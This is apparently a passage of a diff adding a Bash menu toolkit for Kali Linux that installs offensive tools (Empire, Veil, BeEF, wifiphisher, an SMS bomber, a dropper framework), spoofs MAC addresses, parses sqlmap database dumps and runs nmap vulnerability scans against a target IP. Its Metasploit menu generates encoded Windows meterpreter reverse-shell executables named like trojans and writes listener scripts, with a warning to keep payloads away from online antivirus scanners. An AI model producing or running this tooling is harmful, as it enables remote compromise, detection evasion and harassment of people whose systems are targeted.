+			fdbss=0
+			echo -e ""$BR"No databases found or not vulnerable website"$CE""
+			fdbss=0
+			echo -e "$PAKTGB"
+			$READAK
+			continue
+		fi
+		LINED=$(cat "$file" | awk '{if(/available databases /)print NR}')
+		LINED=$((LINED+1))
+		##list databases
+		n=0
+		echo -e ""BS"Calculating..."$CE""
+		while true
+		do
+			CH=$(cat "$file" | awk -v n7="$LINED" '{if(NR==n7)print}')
+			if [[ "$CH" = "" ]]
+			then
+				break
+			else
+				##how many dbs found
+				n=$((n+1))
+				##next line
+				LINED=$((LINED+1))
+			fi
+			CHH=$(echo "$CH" | awk -F "] " {'print $2'})
+			if [[ "$CHH" = "" ]]
+			then
+				echo -e ""$BR"Error 21"$CE""
+				CHH=""$BR"Error"$CE""
+				sleep 3
+			fi
+			db[$n]="$CHH"
+		done
+		sleep 1
+		if [[ "$n" = 0 ]]
+		then
+			echo -e ""$BR"Error 22 No databases found automatically"$CE""
+			echo -e "$PAKTGB"
+			$READAK
+			continue
+		elif [[ "$n" = 1 ]]
+		then
+			echo -e ""$BY"1 database found!"$CE""
+			sleep 1
+		else
+			echo -e ""$BY"$n databases found!"$CE""
+			sleep 1
+		fi
+		echo -e ""
+		FDBS=""$BY"Done"$CE""
+		fdbss=1
+		NDB="$n"
+				##Clearing nexts
+				SD=""
+				sds=0
+				TB=""
+				tbs=0
+				ST=""
+				sts=0
+				cls=0
+				CL=""
+				scs=0
+				SC=""
+	fi	
+done
+}
+function install_ezsploit
+{
+	foldname="ezsploit"
+	gitlink="https://github.com/rand0m1ze/ezsploit.git"
+	install_default
+	cloned=$?
+	if [[ "$cloned" == 1 ]]
+	then
+		chmod +x ezsploit.sh
+	fi
+}
+function install_pimpmykali
+{
+	foldname="pimpmykali"
+	gitlink="https://github.com/Dewalt-arch/pimpmykali.git"
+	install_default
+	cloned=$?
+	if [[ "$cloned" == 1 ]]
+	then
+		cd
+		git clone $gitlink 
+		cd pimpmykali
+		chmod +x pimpmykali.sh
+		./pimpmykali.sh
+	fi
+}
+function install_setoolkit
+{
+	foldname="setoolkit"
+	gitlink="https://github.com/trustedsec/social-engineer-toolkit.git"
+	install_default
+	cloned=$?
+	if [[ "$cloned" == 1 ]]
+	then
+		cd
+		git clone $gitlink setoolkit/
+		cd setoolkit
+		pip3 install -r requirements.txt
+		python setup.py
+	fi
+}
+function install_tbomb
+{
+	foldname="TBomb"
+	gitlink="https://github.com/TheSpeedX/TBomb.git"
+	install_default
+	cloned=$?
+	if [[ "$cloned" == 1 ]]
+	then
+		cd
+		git clone $gitlink
+	fi
+}
+function install_shellter
+{
+	apt-get install -y shellter
+}
+function install_koadic
+{
+	apt -y install koadic
+}
+function install_empire
+{
+	apt install -y powershell-empire
+}
+function install_veil
+{
+	apt -y install veil
+	/usr/share/veil/config/setup.sh --force --silent
+}
+function install_msfpc
+{
+	apt-get install -y msfpc
+}
+function install_beef
+{
+	apt-get install beef-xss
+}
+
+function install_sqlmap
+{
+	apt-get install sqlmap
+}
+	
+function install_dropit_frmw
+{
+	foldname="Dr0p1t-Framework"
+	gitlink="https://github.com/D4Vinci/Dr0p1t-Framework.git"
+	install_default
+	cloned=$?
+	if [[ "$cloned" == 1 ]]
+	then
+		cd
+		git clone $gitlink
+		chmod 777 -R Dr0p1t-Framework
+		cd Dr0p1t-Framework
+		chmod +x install.sh
+		./install.sh
+	fi
+}
+
+function install_airgeddon
+{
+	apt-get install airgeddon
+}
+	
+function install_arp_scan
+	{
+		apt-get install -y arp-scan
+	}
+	function install_fluxion
+	{
+		foldname="fluxion"
+		gitlink="--recursive  https://github.com/FluxionNetwork/fluxion.git"
+		install_default
+	}
+	function install_wifite
+	{
+		apt-get install -y wifite
+	}
+	function install_wifiphisher
+	{
+		apt install -y wifiphisher
+	}
+	function install_fern
+	{
+		if [[ -e "/bin/fern-wifi-cracker" ]]
+		then
+			apt install fern-wifi-cracker
+			echo -e "$PAKTC"
+			$READAK
+			
+		fi		
+	}
+	function install_kickthemout
+	{
+		apt-get install -y nmap
+		foldname="kickthemout"
+		gitlink="https://github.com/k4m4/kickthemout.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
+		then
+			sudo python -m pip install -r requirements.txt
+		fi
+	}
+
+	function install_routersploit
+	{
+		apt install -y routersploit
+	}
+	function install_netdiscover
+	{
+		apt-get install -y netdiscover	
+	}
+	function install_websploit
+	{
+		apt-get install -y websploit
+	}
+function install_sniper
+{
+	foldname="Sn1per"
+	gitlink="https://github.com/1N3/Sn1per.git"
+	install_default
+	cloned=$?
+	if [[ "$cloned" == 1 ]]
+	then
+		chmod +x install.sh
+		./install.sh
+	fi
+}
+
+function install_redhawk
+{
+	foldname="RED_HAWK"
+	gitlink="https://github.com/Tuhinshubhra/RED_HAWK.git"
+	install_default
+}	
+	
+# Function to perform an ARP scan and format the output
+function arp_scan() {
+	echo -e $LB "Scanning, please wait..." $CE
+    # Replace 'wlan0' with your actual network interface if it's different
+    local interface="wlan0"
+
+    # Perform ARP scan using arp-scna tool
+    
+    local scan_output
+    scan_output=$(sudo arp-scan --interface=$interface --localnet)
+	
+    # Extract and format the necessary information
+    echo "$scan_output" | awk '
+    BEGIN {
+        printf "Host(s) found:\n";
+    }
+    /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+\s+[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}/ {
+        printf "%-15s %-17s %s\n", $1, $2, $3;
+    }'
+    echo -e ""$BY" r"$CE") Rescan"
+	echo -e "Press "$BY"any other key"$CE" to go back"
+	read -n 1 ko
+	if [[ "$ko" = "r" ]]
+	then
+		clear
+	    arp_scan
+	else
+ 		MainMenu
+ 	fi	
+}
+
+
+function interface_selection
+{
+if [[ "$WLANCHECKING" = "" ]]
+then
+	echo -e ""$BR" 1"$CE") $WLANN"
+else
+	echo -e ""$BY" 1"$CE") $WLANN"
+fi
+if [[ "$WLANMCHECKING" = "" ]]
+then
+	echo -e ""$BR" 2"$CE") $WLANNM"
+else
+	echo -e ""$BY" 2"$CE") $WLANNM"
+fi
+
+echo -e ""$BY" 3"$CE") "$ETH""
+echo -e ""$BY" b"$CE") Main menu"
+echo -e ""$BY" 0"$CE") EXIT"
+echo -e "Choose: "
+read -e MYINT
+if [[ "$MYINT" = "2" ]]
+then
+	if [[ "$WLANMCHECKING" = "" ]]
+	then
+		MYINT="OFF"
+	else
+		MYINT="$WLANNM"
+	fi
+elif [[ "$MYINT" = "1" ]]
+then
+	if [[ "$WLANCHECKING" = "" ]]
+	then
+		MYINT="OFF"
+	else
+		MYINT="$WLANN"
+	fi
+elif [[ "$MYINT" = "0" ]]
+then
+	clear
+	exit
+elif [[ "$MYINT" = "00" || "$MYINT" = "b" ]]
+then
+	exec bash "$0"
+elif [[ "$MYINT" = "3" ]]
+then
+	MYINT="$ETH"
+else
+echo -e "Wrong choice..."
+sleep 2
+clear
+echo -e "EXITING"
+sleep 1
+exec bash "$0"
+fi
+export MYINT
+}
+
+function change_mac
+{	clear
+	interface_selection
+	clear
+	if [[ "$MYINT" = "OFF" ]]
+	then
+		echo -e "Interface not available"
+		sleep 2
+	else
+		echo -e "Change it to a random or specific?("$BY"r"$CE"/"$BY"s"$CE")("$BY"Enter"$CE"=r): "
+		read -e RORS
+		clear
+		if [[ "$RORS" != "s" ]]
+		then
+			echo -e "Changing mac address of $MYINT to a random one..."
+			ifconfig $MYINT down
+			macchanger -r $MYINT
+			ifconfig $MYINT up
+			echo -e "Done."
+		else
+			echo -e "Enter the MAC you want:"
+			read -e SMAC
+			echo -e "Changing mac address of $MYINT to $SMAC..."
+			ifconfig $MYINT down
+			macchanger -m $SMAC $MYINT
+			ifconfig $MYINT up
+			echo -e "Done."
+		fi
+	fi
+}
+
+
+function orginal_mac 
+{		clear
+                interface_selection
+		clear
+		echo -e "Changing mac address of $MYINT to the original one..."
+		ifconfig $MYINT down
+		macchanger -p $MYINT
+		ifconfig $MYINT up
+		echo -e "Done."
+}
+
+
+function public_ip
+{
+	clear
+	echo -e ""$BB"Please wait..."$CE""
+	CHECKMON=$(ifconfig | grep "mon")
+	if [[ "$CHECKMON" = "" ]]
+	then
+		clear
+		PUBLICIP=$(curl -s ipinfo.io/ip)
+		if [[ "$PUBLICIP" = "" ]]
+		then
+			PUBLICIP=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
+			if [[ "$PUBLICIP" = "" ]]
+			then
+				clear
+				PUBLICIP="Connection error."
+			fi
+		fi
+		echo -e "$BR"INFO:"$CE"
+		echo "Your public IP is: "$PUBLICIP""
+		#~ curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'
+	else
+		echo -e "When monitor mode is enabled, you don't have internet access."
+		echo -e "Select 'd2' to disable monitor mode"
+		echo -e "$PAKTGB"
+		$READAK
+		clear
+		exec bash "$0"
+	fi
+}
+
+function view_mac
+{		clear
+                interface_selection
+		clear
+		echo "Your MACs: "
+		macchanger -s $MYINT
+}
+
+
+
+
+function install_default
+{
+		if [[ "$foldname" == "" ]]
+		then
+			testgit=$(echo "$gitlink" | grep ".git")
+			if [[ "$testgit" == "" ]]
+			then
+				foldname=$(echo "$gitlink" | cut -d '/' -f5)
+			else
+				foldname=$(echo "$gitlink" | cut -d '/' -f2 | cut -d '.' -f1)
+			fi
+		fi
+		if [[ -d "/root/"$foldname"" ]]
+		then
+			if [[ "$NOCONFIRM" == 1 ]]
+			then
+					if [[ "$foldname" != "" ]]
+					then
+						echo -e ""$BY"Removing: "$foldname""$CE""
+						rm -r /root/"$foldname"
+						cd
+						git clone $gitlink	
+						cd "$foldname"
+						return 1
+					fi
+			else
+				echo -e ""$BY"Removing old and install again?"$CE" ("$BY"y"$BY"/"$BY"n"$CE")"
+				read ROIN
+				if [[ "$ROIN" == "y" ]]
+				then
+					if [[ "$foldname" != "" ]]
+					then
+						echo -e ""$BY"Removing: "$foldname""$CE""
+						rm -r /root/"$foldname"
+						cd
+						git clone $gitlink	
+						cd "$foldname"
+						return 1
+					fi
+				else
+					return 0
+				fi
+			fi
+		else 
+			cd
+			git clone $gitlink	
+			cd "$foldname"
+			return 1
+		fi
+}
+
+
+function install_anonsurf
+{
+		foldname="kali-anonsurf"
+		gitlink="https://github.com/Und3rf10w/kali-anonsurf.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
+		then
+			chmod +x installer.sh
+			./installer.sh
+		fi
+}
+
+
+function anonsurf_start
+{
+		if [[ ! -f "/usr/bin/anonsurf" ]]
+		then
+			echo -e ""$BR"Anonsurf is not installed.type '"$CE""$BY"install"$CE""$BR"' to install it."
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_anonsurf
+			fi
+		else
+			echo -e "Enabling anonsurf..."
+			anonsurf start
+			echo -e "Done."
+		fi
+}
+
+
+function anonsurf_stop
+{
+		if [[ ! -f "/usr/bin/anonsurf" ]]
+		then
+			echo -e ""$BR"Anonsurf is not installed.type '"$CE""$BY"install"$CE""$BR"' to install it."
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_anonsurf
+			fi
+		else
+			echo -e "Disabling anonsurf..."
+			anonsurf stop
+			echo -e "Done."
+		fi
+}
+
+
+
+
+function anonsurf_status
+{
+
+		if [[ ! -f "/usr/bin/anonsurf" ]]
+		then
+			echo -e ""$BR"Anonsurf is not installed.type '"$CE""$BY"install"$CE""$BR"' to install it."
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_anonsurf
+			fi
+		else
+			echo -e "Status of anonsurf..."
+			anonsurf status
+			echo -e "Done."
+		fi
+}
+
+function anonsurf_restart
+{
+		if [[ ! -f "/usr/bin/anonsurf" ]]
+		then
+			echo -e ""$BR"Anonsurf is not installed.type '"$CE""$BY"install"$CE""$BR"' to install it."
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_anonsurf
+			fi
+		else
+			echo -e "Restarting anonsurf..."
+			anonsurf change
+			echo -e "Done."
+		fi
+}
+
+
+function searchsploit_menu
+{
+	clear
+	echo -e "Search: "
+	read FSEARCH
+	searchsploit "$FSEARCH"
+	echo -e "$PAKTGB"
+	$READAK
+}
+
+function metasploit_menu
+{
+	if [[ ! -d "$LPATH"/rc ]]
+	then
+		mkdir "$LPATH"/rc
+	fi
+	while true
+	do
+	clear
+	TERMINALTITLE="METASPLOIT"
+	dash_calc
+	printf '\033]2;METASPLOIT\a'
+	echo -e ""$BY" 1"$CE") Create payload with msfvenom"
+	echo -e ""$BY" 2"$CE") Create listener"
+	echo -e ""$BY" 3"$CE") Saved listeners"
+	echo -e ""$BY" 4"$CE") Start msfconsole"
+	echo -e ""$BY" 5"$CE") Update msfconsole"
+	echo -e ""$BY" 6"$CE") Armitage"
+	echo -e ""$BY" 7"$CE") Findsploit"
+	echo -e ""$BY" b"$CE") Go back"
+	echo -e ""$BY" 0"$CE") EXIT"
+	echo -e "Choose: "
+	read -e METASP
+	clear
+	if [[ "$METASP" = "1" ]]
+	then
+		PAYLOADL=""
+		echo -e "PAYLOAD (Default: "$BY"windows/meterpreter/reverse_tcp"$CE"): "
+		read PAYLOADL
+		if [[ -z "$PAYLOADL" ]]
+		then
+			echo -e "Setting PAYLOAD to windows/meterpreter/reverse_tcp"
+			sleep 2
+			PAYLOADL="windows/meterpreter/reverse_tcp"
+		fi
+		echo -e "LHOST: "
+		read ATIP
+		echo -e ""
+		echo -e "LPORT: "
+		read ATPORT
+		echo -e ""
+		echo -e "Enter the target's architecture("$BY"x86"$CE"/"$BY"x64"$CE"): "
+		read TARCH
+		echo -e "Enter the name of the payload(e.g: "$BY"trojan2"$CE"): "
+		read ATEXE
+		ATEXEPATH="/root/Desktop/$ATEXE.exe"
+		clear
+		echo -e "Generating"
+		sleep 0.1
+		echo .
+		sleep 0.1
+		echo ..
+		sleep 0.1
+		echo ...
+		sleep 0.1
+		echo ....
+		sleep 0.1
+		echo .....
+		sleep 0.1
+		echo ......
+		if [[ "$TARCH" = "x64" ]]
+		then
+			msfvenom -p $PAYLOADL --platform windows -a x64 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
+		else
+			msfvenom -p $PAYLOADL --platform windows -a x86 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
+		fi
+		echo -e "Done."
+		echo -e ""
+		echo -e "$PAKTC"
+		$READAK
+		clear
+		echo -e "Create a listener for this payload? $YNYES "
+		read PAYL
+		if [[ "$PAYL" != "n" ]]
+		then
+			echo -e "Name of listener(e.g: "$BY"john"$CE") : "
+			read NAMEL
+			echo "use exploit/multi/handler" > "$LPATH"/rc/"$NAMEL".rc
+			echo "set PAYLOAD $PAYLOADL " >> "$LPATH"/rc/"$NAMEL".rc
+			echo "set LHOST $ATIP " >> "$LPATH"/rc/"$NAMEL".rc
+			echo "set LPORT $ATPORT " >> "$LPATH"/rc/"$NAMEL".rc
+			echo "set ExitOnSession false" >> "$LPATH"/rc/"$NAMEL".rc
+			echo "exploit -j" >> "$LPATH"/rc/"$NAMEL".rc
+			clear
+			echo -e "Launch the listener now? "$YNONLY""
+			read LLN
+			if [[ "$LLN" = "y" ]]
+			then
+				echo -e "Launching msfconsole..."
+				sleep 2
+				clear
+				msfconsole -r "$LPATH"/rc/"$NAMEL".rc
+			fi
+		fi
+	elif [[ "$METASP" = "z" ]]
+	then
+		clear
+		echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
+		sleep 3
+		echo -e "You agree with that?("$BY"YES"$CE"/"$BY"*"$CE")"
+		read MUSTBEYES
+		if [[ "$MUSTBEYES" = "YES" ]] 
+		then 
+			clear
+			cd /root/zirikatu
+			./zirikatu.sh
+		fi
+	elif [[ "$METASP" = "2" ]]
+	then
+		clear
+		echo -e "LHOST: "
+		read LHOSTL
+		echo -e "LPORT: "
+		read LPORTL
+		echo -e "PAYLOAD (Default: "$BY"windows/meterpreter/reverse_tcp"$CE"): "
+		read PAYLOADL
+		if [[ -z "$PAYLOADL" ]]
+		then
+			echo -e "Setting PAYLOAD to windows/meterpreter/reverse_tcp"
+			sleep 2
+			PAYLOADL="windows/meterpreter/reverse_tcp"
+		fi
+		echo -e "Name of listener(e.g: "$BY"john"$CE") : "
+		read NAMEL
+		echo "use exploit/multi/handler" > "$LPATH"/rc/"$NAMEL".rc
+		echo "set PAYLOAD $PAYLOADL " >> "$LPATH"/rc/"$NAMEL".rc
+		echo "set LHOST $LHOSTL " >> "$LPATH"/rc/"$NAMEL".rc
+		echo "set LPORT $LPORTL " >> "$LPATH"/rc/"$NAMEL".rc
+		echo "set ExitOnSession false" >> "$LPATH"/rc/"$NAMEL".rc
+		echo "exploit -j" >> "$LPATH"/rc/"$NAMEL".rc
+		clear
+		echo -e "Launch the listener now? "$YNONLY""
+		read LLN
+		if [[ "$LLN" = "y" ]]
+		then
+			echo -e "Launching msfconsole..."
+			sleep 2
+			clear
+			msfconsole -r "$LPATH"/rc/"$NAMEL".rc
+		fi
+	elif [[ "$METASP" = "3" ]]
+	then
+		while true
+		do
+		clear
+		ls -w 1 "$LPATH"/rc
+		echo -e ""
+		echo -e ""
+		echo -e "Enter the name of the listener you want to select(e.g: "$BY"john"$CE")"
+		echo -e ""$BY" r"$CE") Delete all saved listeners"
+		echo -e ""$BY" b"$CE") Go back"
+		read NAMERC
+		clear
+		if [[ "$NAMERC" = "back" || "$NAMERC" = "b" ]]
+		then
+			break
+		elif [[ "$NAMERC" = "reset" || "$NAMERC" = "r" ]]
+		then
+			rm -f "$LPATH"/rc/*
+			continue
+		fi
+		if [[ ! -f "$LPATH"/rc/"$NAMERC" ]]
+		then
+			NAMERC="$NAMERC".rc
+			if [[ ! -f "$LPATH"/rc/"$NAMERC" ]]
+			then
+				echo -e "File not found. Try again.."
+				sleep 2
+				continue
+			fi
+		fi
+		while true
+		do
+		clear
+		echo -e ""$NAMERC" selected."
+		echo -e ""$BY" 1"$CE") Start listener"
+		echo -e ""$BY" 2"$CE") Delete listener"
+		echo -e ""$BY" b"$CE") Go back"
+		echo -e "Choose: "
+		read LISTL
+		if [[ "$LISTL" = "1" ]]
+		then
+			msfconsole -r "$LPATH"/rc/"$NAMERC"
+		elif [[ "$LISTL" = "2" ]]
+		then
+			rm "$LPATH"/rc/"$NAMERC"
+			break
+		elif [[ "$LISTL" = "back" || "$LISTL" = "b" ]]
+		then
+			break
+		fi
+		done
+		done
+	elif [[ "$METASP" = "4" ]]
+	then
+		msfconsole
+	elif [[ "$METASP" = "5" ]]
+	then
+		apt update; apt install metasploit-framework | grep metasploit-framework
+		
+		echo -e "$PAKTC"
+		$READAK
+	elif [[ "$METASP" = "6" ]]
+	then
+		service postgresql start
+		armitage
+		clear
+	elif [[ "$METASP" = "7" ]]
+	then
+		searchsploit_menu
+	elif [[ "$METASP" = "back" || "$METASP" = "b" ]]
+	then
+		BACKL="1"
+		MainMenu
+	elif [[ "$METASP" = "00" ]]
+	then
+		exec bash "$0"
+	elif [[ "$METASP" = "0" ]]
+	then
+		clear
+		exit
+	fi
+	done
+}
+
+function hashid_install
+{
+	apt-get -y install hash-identifier
+}
+
+function hash_identifier
+{
+		if [[ ! -f /usr/bin/hash-identifier && ! -f /usr/sbin/hash-identifier ]]
+		then
+			echo -e ""$BB"Installing hash-identifier"$CE""
+			install_hashid_install
+			clear
+		else
+			hash-identifier
+		fi
+				
+}
+
+
+#Reconnaisance with Nmap functions
+recon() {	
+
+	if [[ ! -d "$LPATH"/scans ]];then				
+	mkdir	"$LPATH"/scans
+	fi
+	if [[ ! -d "$LPATH"/scans/port_scans ]];then				
+	mkdir	"$LPATH"/scans/port_scans
+	fi
+	if [[ ! -d "$LPATH"/scans/aggr_scans ]];then				
+	mkdir	"$LPATH"/scans/aggr_scans
+	fi
+	if [[ ! -d "$LPATH"/scans/script_scans ]];then				
+	mkdir	"$LPATH"/scans/script_scans
+	fi
+	if [[ ! -d "$LPATH"/scans/full_scans ]];then				
+	mkdir	"$LPATH"/scans/full_scans
+	fi
+
+# Function to log messages
+log_message() {
+    local MESSAGE="$1"
+    local LOG_FILE="nmap_scan.log"
+    echo "$(date +"%Y-%m-%d %T"): $MESSAGE" >> "$LOG_FILE"
+}
+
+# Function to run port scan
+run_port_scan() {
+    local IP=$1
+    #local OUTPUT_FILE=""$LPATH"/scans/port_scans/"$IP"-nmap-port-scan.txt"
+    
+    # Start with file number 1
+	local counter=1
+
+	# Construct the filename with the counter
+	local OUTPUT_FILE="$LPATH/scans/port_scans/${IP}-nmap-port-scan_${counter}.txt"
+
+	# Check if the filename already exists, if so, increment the counter
+	while [[ -e "$OUTPUT_FILE" ]]; do
+    	(( counter++ ))
+    	OUTPUT_FILE="$LPATH/scans/port_scans/${IP}-nmap-port-scan_${counter}.txt"
+	done
+
+    echo
+    echo "+++++Scan Running+++++"
+    echo 
+    log_message "Running Port scan on $IP..."
+    local port_scan_results=$(nmap -p- --open -sS --min-rate 5000 -Pn -n $IP)
+
+    # Display scan results
+    echo "$port_scan_results"
+    echo "-----Scan Finished-----"
+    echo
+    
+    # Save Nmap scan results to a file
+    log_message "Saving Port scan results to $OUTPUT_FILE..."
+    echo "$port_scan_results" > "$OUTPUT_FILE"
+    log_message "Scan results saved to $OUTPUT_FILE."
+    echo -e "${BB}Scan results saved to $OUTPUT_FILE. ${CE}"
+    echo -e "$PAKTC"
+	$READAK
+	recon
+}
+
+# Function to run Aggressive scan
+run_aggressive_scan() {
+    local IP=$1
+
+    
+    # Start with file number 1
+	local counter=1
+
+	# Construct the filename with the counter
+	local OUTPUT_FILE="$LPATH/scans/aggr_scans/${IP}-nmap-aggressive-scan_${counter}.txt"
+
+	# Check if the filename already exists, if so, increment the counter
+	while [[ -e "$OUTPUT_FILE" ]]; do
+    	(( counter++ ))
+    	OUTPUT_FILE="$LPATH/scans/aggr_scans/${IP}-nmap-aggressive-scan_${counter}.txt"
+	done
+    
+    echo
+    echo "+++++Scan Running+++++"
+    echo 
+    log_message "Running Aggressive scan on $IP..."
+    local aggressive_scan_results=$(nmap -T4 -A  $IP)
+
+    # Display scan results
+    echo "$aggressive_scan_results"
+    echo
+    echo "-----Scan Finished-----"
+    echo
+    
+    # Save Nmap scan results to a file
+    log_message "Saving Aggressive scan results to $OUTPUT_FILE..."
+    echo "$aggressive_scan_results" > "$OUTPUT_FILE"
+    log_message "Scan results saved to $OUTPUT_FILE."
+    echo -e "${BB}Scan results saved to $OUTPUT_FILE.${CE}"
+    echo -e "$PAKTC"
+	$READAK
+	recon
+}
+
+# Function to run Script scan
+run_script_scan() {
+    local IP=$1
+    #local OUTPUT_FILE="$IP-nmap-script-scan.txt"
+	
+    
+    # Start with file number 1
+	local counter=1
+
+	# Construct the filename with the counter
+	local OUTPUT_FILE="$LPATH/scans/script_scans/${IP}-nmap-script-scan_${counter}.txt"
+
+	# Check if the filename already exists, if so, increment the counter
+	while [[ -e "$OUTPUT_FILE" ]]; do
+    	(( counter++ ))
+    	OUTPUT_FILE="$LPATH/scans/script_scans/${IP}-nmap-script-scan_${counter}.txt"
+	done
+    echo
+    echo "+++++Scan Running+++++"
+    echo 
+    log_message "Running Script scan on $IP..."
+    local script_scan_results=$(nmap -sC $IP)
+    
+    # Display scan results
+    echo "$script_scan_results"
+    echo
+    echo "-----Scan Finished-----"
+    echo
+    
+    # Save Nmap scan results to a file
+    log_message "Saving Script scan results to $OUTPUT_FILE..."
+    echo "$script_scan_results" > "$OUTPUT_FILE"
+    log_message "Scan results saved to $OUTPUT_FILE."
+    echo -e "${BB}Scan results saved to $OUTPUT_FILE.${CE}"
+    echo -e "$PAKTC"
+	$READAK
+	recon
+}
+
+# Function to run Autoscan
+# Function to perform a 3 choices combined Nmap scan
+run_autoscan() {
+    local IP="$1"
+    # Start with file number 1
+	local counter=1
+
+	# Construct the filename with the counter
+	local OUTPUT_FILE="$LPATH/scans/full_scans/${IP}-autoscan_${counter}.txt"
+
+	# Check if the filename already exists, if so, increment the counter
+	while [[ -e "$OUTPUT_FILE" ]]; do
+    	(( counter++ ))
+    	OUTPUT_FILE="$LPATH/scans/full_scans/${IP}-autoscan_${counter}.txt"
+	done
+    echo
+    echo "+++++Scan Running+++++"
+    echo 
+    log_message "Running autoscan  on $IP..."
+    # Port Nmap scan to get open ports
+    port_scan_output=$(nmap -p- --open -sS --min-rate 5000 -Pn -n "$IP")
+    open_ports=$(echo "$port_scan_output" | awk '/^ *[0-9]+\/(tcp|udp)[ ]*open[ ]*/ {print $1}' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
+    if [ -n "$open_ports" ]; then
+        
+        # Print port scan results
+        echo "Scanning for Open Ports...."
+        echo "------------------------------------------------------------------------------------------------------------------------------"
+        echo "$port_scan_output"
+		echo "------------------------------------------------------------------------------------------------------------------------------"
+		echo "Port Scan Completed."
+		echo
+        # Aggressive scan using open ports
+        echo "Running Aggressive scan on Open Ports...."
+        echo "------------------------------------------------------------------------------------------------------------------------------"
+        echo "Aggressive scan with open ports: $open_ports"
+        aggr_scan_output=$(nmap -p "$open_ports" -T4 -A -F "$IP")
+        echo "$aggr_scan_output"
+        echo "Aggressive Scan Completed."
+        echo
+		echo "------------------------------------------------------------------------------------------------------------------------------"
+        echo "Script Scanning for Vulnerabilities..."
+        echo "------------------------------------------------------------------------------------------------------------------------------"
+        # Script scan using open ports
+        echo "Script scan with open ports: $open_ports"
+        script_scan_output=$(nmap -p "$open_ports" --script=vuln "$IP")
+        echo "------------------------------------------------------------------------------------------------------------------------------"
+        echo "Script Scan Completed."
+    	echo
+    	echo "-----Scan Finished-----"
+    	echo
+    	
+    	# Save Nmap scan results to a file
+    	log_message "Saving  autoscan results to $OUTPUT_FILE..."
+    	
+    	
+		echo -e "Port Scan\n$port_scan_output\n" > "$OUTPUT_FILE"
+		echo -e "Aggressive Scan\n$aggr_scan_output\n" >> "$OUTPUT_FILE"
+		echo -e "Script Scan\n$script_scan_output\n" >> "$OUTPUT_FILE"
+
+    	
+    	log_message "Scan results saved to $OUTPUT_FILE."
+    	echo -e "${BB}Scan results saved to $OUTPUT_FILE. ${CE}"
+    	echo -e "$PAKTC"
+		$READAK
+		recon
+    else
+        echo "No open ports found."
+    fi
+
+# Check if target IP address is provided
+if [ -z "$1" ]; then
+    echo "Usage: $0 <target>"
+    exit 1
+fi
+
+# Call the function with the provided target IP address
+#run_autoscan "$1"
+}
+
+
+
+
+run_scripts_scanner() {
+    clear
+    python3 ScrScanner
+    
+}
+
+
+prompt_target_ip() {
+    read -p "[+] Enter the target IP address: " TARGET_IP
+}
+
+
+# Welcome banner
+clear
+echo -e "\t+++++++++++++++++++++++++++++++++++++++++++"
+echo -e $BG"\t██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗"
+echo -e $BG"\t██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║"
+echo -e $BG"\t██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║"
+echo -e $BG"\t██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║"
+echo -e $BG"\t██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║"
+echo -e $BG"\t╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝"
+echo -e "\t+++++++++++++++++++++++++++++++++++++++++++"
+echo
+
+# Variable to store the target IP address
+#TARGET_IP=""
+
+# Prompt user to enter target IP address only if TARGET_IP is empty
+while [ -z "$TARGET_IP" ]; do
+    read -p "[+] Enter the target IP address: " TARGET_IP
+done
+
+# Display current target IP address
+echo "Target IP address set to: $TARGET_IP"
+    
+script_search() {
+    # Prompt the user to enter a keyword to search for script details
+    read -p "Enter a keyword to search for script details: " keyword
+    
+    # Search for script details containing the keyword in the script name, category, or description
+    search_result=$(nmap --script-help all | grep -i "$keyword")
+    
+    # Check if any search results were found
+    if [ -n "$search_result" ]; then
+        # Display the search results
+        echo "Search results for '$keyword':"
+        echo "$search_result"
+    else
+        echo "No matching scripts found for '$keyword'."
+    fi
+   echo -e "$PAKTC"
+	$READAK
+	rscript_main
+}
+
+
+
+rscript_main() {
+    
+    # Validate IP address format
+    if [[ ! $TARGET_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+        log_message "Invalid IP address format: $TARGET_IP"
+        echo "Invalid IP address format"
+        $READAK
+        recon
+    fi
+	#Welcome banner
+    clear
+    figlet -f slant "RECON"
+    echo 
+	echo "Target Set: $TARGET_IP "
+    # Prompt user to choose scan type
+    echo "Scan Menu:"
+    echo "t) change target"
+    echo "1) Port scan"
+    echo "2) Aggressive scan"
+    echo "3) Simple Script scan [default NSE]"
+    echo "4) Autoscan [Time Saver] "
+    echo "5) Advance Script Scanner [all NSE]"
+    echo "s) Script Search"
+    echo "0) Back to main Menu "
+    read -p "Enter your choice : " SCAN_CHOICE
+
+    if [[ $SCAN_CHOICE == "t" ]]; then
+        change_target
+		$READAK
+    elif [[ $SCAN_CHOICE == "1" ]]; then
+        run_port_scan "$TARGET_IP"
+		$READAK
+	elif [[ $SCAN_CHOICE == "2" ]]; then
+    	run_aggressive_scan "$TARGET_IP"
+        $READAK
+	elif [[ $SCAN_CHOICE == "3" ]]; then
+    	run_script_scan "$TARGET_IP"
+        $READAK
+	elif [[ $SCAN_CHOICE == "4" ]]; then
+    	run_autoscan "$TARGET_IP"
+        $READAK
+	elif [[ $SCAN_CHOICE == "5" ]]; then
+    	run_scripts_scanner
+    	$READAK
+	elif [[ $SCAN_CHOICE == "s" ]]; then
+    	script_search
+    	$READAK
